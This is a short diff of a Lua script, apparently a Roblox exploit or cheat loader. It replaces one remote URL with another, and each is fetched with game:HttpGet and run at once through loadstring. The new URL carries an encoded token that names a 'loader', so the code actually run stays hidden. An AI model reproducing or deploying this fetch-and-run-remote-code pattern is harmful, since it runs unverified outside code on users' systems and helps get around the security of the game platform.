@@ -11,7 +11,8 @@ local function firstScript()
 end
 
 local function secondScript()
-    loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/ff285f868f5ddd5b9b1eeaaafb4be2b74e836d13f5c399eaa9408a8962d24c5c/download"))()
+    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjgxN2EyNjcyLTZhN2ItNDQ0MS05ZDc5LWE5NmRlMDZiY2JmOCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
+
 end
 
 if allowedPlaceIds[game.PlaceId] then
